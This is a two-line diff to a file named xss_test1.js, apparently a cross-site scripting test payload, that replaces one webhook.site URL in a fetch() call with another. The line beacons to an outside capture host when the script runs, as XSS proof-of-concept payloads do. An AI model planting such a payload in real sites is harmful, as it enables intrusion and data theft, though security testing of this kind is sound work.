@@ -1,2 +1,2 @@
 // xss_test1.js
-fetch('https://webhook.site/2bbcc730-4932-43ed-a209-a85203091910')
+fetch('https://webhook.site/fa355fde-d27c-4f03-b1fd-9087adffc9eb')
